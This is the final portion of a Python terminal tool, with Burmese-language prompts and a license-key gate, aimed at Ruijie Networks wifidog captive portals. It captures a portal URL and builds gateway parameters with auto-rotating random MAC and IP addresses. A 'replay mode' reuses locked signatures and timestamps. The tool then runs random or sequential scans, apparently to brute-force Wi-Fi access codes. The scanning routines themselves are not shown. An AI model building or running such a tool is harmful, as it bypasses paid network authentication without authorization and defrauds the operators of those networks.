            c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        except (KeyboardInterrupt, EOFError, Exception):
            return None
        if c == "0":
            return None
        if c in [str(i) for i in range(1, len(lengths) + 1)]:
            return lengths[int(c) - 1]


def ask_scan():
    while True:
        show_banner()
        try:
            console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random")
            console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential\n")
            console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
            c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        except (KeyboardInterrupt, EOFError, Exception):
            return None
        if c == "0":
            return None
        if c in ("1", "2"):
            return {"1": "random", "2": "sequential"}[c]


def prompt_manual_url():
    try:
        console.print(Panel(
            Align.center(Text(
                "📋 Portal URL ကို copy ပြီး ဒီမှာ paste လုပ်ပါ\n"
                "(Browser address bar က full URL — /api/auth/wifidog?... သို့ /auth/wifidogAuth/login/?...)",
                style="bold yellow")),
            border_style="yellow", box=ROUNDED))
        u = Prompt.ask("  [bright_cyan]➜ Portal URL[/bright_cyan]").strip()
    except (KeyboardInterrupt, EOFError, Exception):
        return None
    if not u:
        return None
    if "ruijienetworks" not in u:
        try:
            console.print("[red]✗ ruijienetworks URL မဟုတ်ပါ[/red]")
        except Exception:
            pass
        return None
    return u


def run():
    global LICENSE_INFO
    show_banner()

    ok, msg = check_license()
    while not ok:
        clear_screen()
        try:
            console.print(Panel(Align.center(Text("🔐 Enter License Key (or 'q' to quit)",
                                                   style="bold yellow")),
                                border_style="yellow"))
            k = Prompt.ask("  ➜ Key").strip()
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)
        except Exception:
            sys.exit(0)
        if k.lower() in ("q", "quit", "exit"):
            sys.exit(0)
        if not k:
            continue
        ok2, m2 = activate_license(k)
        try:
            console.print(Panel(Align.center(Text(m2,
                                                  style="bold green" if ok2 else "bold red")),
                                border_style="green" if ok2 else "red"))
        except Exception:
            pass
        time.sleep(1.5)
        ok, msg = check_license()
    LICENSE_INFO["status"] = msg

    portal_url = detect_and_capture()

    if not portal_url:
        portal_url = prompt_manual_url()
        if not portal_url:
            try:
                console.print("[yellow]⚠ URL မရ — default gateway params နဲ့ဆက်မယ်[/yellow]")
            except Exception:
                pass

    gw_params = build_gw_params(portal_url)

    try:
        console.print(f"[dim]  • base      : {gw_params.get('_base') or gw_params.get('url')}[/dim]")
        console.print(f"[dim]  • path      : {gw_params.get('_path')}[/dim]")
        console.print(f"[dim]  • mac       : {gw_params.get('mac') or 'random (auto-rotate)'}[/dim]")
        console.print(f"[dim]  • ip        : {gw_params.get('ip') or 'random (auto-rotate)'}[/dim]")
        console.print(f"[dim]  • sign      : {'✓ LOCKED' if gw_params.get('sign') else '✗'}[/dim]")
        console.print(f"[dim]  • timestamp : {gw_params.get('timestamp', '✗')}[/dim]")
        console.print(f"[dim]  • v         : {gw_params.get('v', '2')}[/dim]")
        if gw_params.get("_locked"):
            console.print("[green]  ✓ sign+timestamp LOCKED — replay mode active[/green]")
    except Exception:
        pass
    time.sleep(1.5)

    while True:
        mode = ask_mode()
        if mode is None:
            break
        length = ask_length(mode)
        if length is None:
            continue
        scan_m = ask_scan()
        if scan_m is None:
            continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_m, gw_params))
        except KeyboardInterrupt:
            pass
        except Exception as e:
            try:
                console.print(f"[bold red]Error: {e}[/bold red]")
            except Exception:
                pass
            time.sleep(1.5)


def main():
    try:
        run()
    except (KeyboardInterrupt, EOFError):
        try:
            console.print("\n[bold red]Exiting...[/bold red]")
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            console.print()
            console.print(Text(f"✨ {APP_TAG} ✨", style="bold bright_green"),
                           justify="center")
        except Exception:
            pass
        time.sleep(1)


if __name__ == "__main__":
    main()

